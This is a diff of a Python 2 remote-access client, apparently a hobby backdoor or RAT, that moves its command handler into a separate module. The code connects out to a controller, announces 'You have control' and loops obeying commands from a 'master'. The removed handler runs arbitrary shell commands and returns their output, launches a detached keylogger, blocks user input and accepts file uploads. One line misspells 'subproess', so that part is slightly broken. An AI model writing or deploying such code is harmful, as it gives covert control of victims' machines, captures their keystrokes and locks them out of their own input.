@@ -7,10 +7,10 @@
 #\author Elephant Bomb
 #
 #\date 2016-04-10
+from shell import runShell
 import pythoncom
 import pyHook
 import socket
-import subprocess
 import sys
 import thread
 import time
@@ -18,56 +18,10 @@ import time
 HOST = '127.0.0.1'   
 PORT = 22
 
-def incomingFile(data, socketHolder):
-    print data
-    nextData = socketHolder.recv(1024)
-    while nextData:
-        if nextData == "FILEDONE": 
-            break
-        else:
-            with open("client_data.txt", 'w') as file:
-                file.write(nextData)
-            nextData = socketHolder.recv(1024)
-
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socketHolder.connect((host, port))
 	return socketHolder
-
-def run_shell_cmd(socketHolder):
-    data = socketHolder.recv(1024)
-    if data:
-        if data == "SENDFILE":
-            incomingFile(data, socketHolder)
-        elif data == "exit":
-            socketHolder.send('exit')
-            socketHolder.close()
-            sys.exit(0)
-        elif data == "logKeysOn":
-            # Execute an external program without waiting for it to finish
-            CREATE_NEW_PROCESS_GROUP = 0x00000200
-            DETACHED_PROCESS = 0x00000008
-            pid = subprocess.Popen([sys.executable, "logKeys.py"],
-                creationflags=DETACHED_PROCESS).pid
-            socketHolder.send('Logger started')
-        elif data == 'blockInput':
-            CREATE_NEW_PROCESS_GROUP = 0x00000200
-            DETACHED_PROCESS = 0x00000008
-            pid = subproess.Popen([sys.executable, "blockInput.py"],
-                creationflags=DETACHED_PROCESS).pid
-            socketHolder.send('Block Input started')
-        elif len(data) == 0:
-            return True
-        else:
-			proc = subprocess.Popen(data, shell=True,
-				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-				stdin=subprocess.PIPE)
-			stdout_value = proc.stdout.read() + proc.stderr.read()
-			socketHolder.send(stdout_value)
-			return False
-    else:
-		print 'Lost connection to host. Will attempt to reconnect.'
-		socketHolder = connect((HOST,PORT))
 
 def main():
     while True:
@@ -75,7 +29,7 @@ def main():
                 socketHolder = connect((HOST,PORT))
                 socketHolder.send('You have control')
                 while True:
-                    commandsFromMaster = run_shell_cmd(socketHolder)
+                    commandsFromMaster = runShell(socketHolder)
                 socketHolder.close()
             except socket.error:
                 pass
